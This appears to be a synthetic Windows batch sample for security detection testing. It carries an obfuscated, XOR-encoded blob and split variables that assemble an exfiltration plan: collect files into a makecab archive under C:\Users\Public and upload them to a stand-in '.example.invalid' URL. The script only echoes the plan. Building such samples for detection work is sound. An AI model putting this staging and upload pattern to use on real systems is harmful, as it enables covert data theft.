@echo off
setlocal EnableExtensions EnableDelayedExpansion
rem HUNTRESS-CODEC:split_fragments|reverse_xor
rem HUNTRESS-MATERIAL:V1JcX0NGHFdaX1JFXVodVl9DXlJLVh0LBFYLVQIDUAoKHBwJQENHR1sOX0FGbFdSXF9DRk9RUlAdCwRWC1UCA1AKCh5HUFZfX1xQb1FSf0BAVkFHXUZ7b1BaX1FGY29AQVZAZm8JcA5bR1JDbFZQQUZcQE8LBFYLVQIDUAoKHl1UWlJDXlJQDldabF1UWlJDXlJQT1ZdXF0OVlRSRlRdUl9sR0tWXU9XXVxeUlpXDltDUkFUTwIOR11GXFBsVlRSR0BPVktWHVFSUFZYUl4OQVZHQ1JXUk9WR1xeVkFsV1JcX0NGH0FWVUBdUkFHbFZBUkNWQUMfX1JQXF9sVkdSUFxfDkBDVkdATwIORQ==
rem HUNTRESS-EXTENSION:bat
if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT
if /i "%~1"=="--plan" goto :HUNTRESS_PLAN
exit /b 0
:HUNTRESS_INSPECT
set "v_a0=v=1|steps=locate_local,prepare_transfer,upload_remote|adapter=makec"
set "v_a1=ab.exe|stage_count=1|graph=diamond|next_language=none|campaign_id=c"
set "v_a2=ampaign-99c01f8e78|source_path=C:\Users\Public\HuntressLab\collect-"
set "v_a3=99c01f8e78.cab|upload_url=https://99c01f8e78.example.invalid/upload"
goto :HUNTRESS_SEPARATOR_DONE
ver >nul & rem HUNTRESS separator ampersand
:HUNTRESS_SEPARATOR_DONE
set "neutral_arithmetic=b31add1d"
ver >nul
if errorlevel 1 exit /b 1
call set "cfg=%%v_a0%%%%v_a1%%%%v_a2%%%%v_a3%%"
echo(!cfg!
exit /b 0
:HUNTRESS_UNUSED
goto :HUNTRESS_PLAN
:HUNTRESS_PLAN
echo makecab.exe upload C:\Users\Public\HuntressLab\collect-99c01f8e78.cab to https://99c01f8e78.example.invalid/upload
exit /b 0
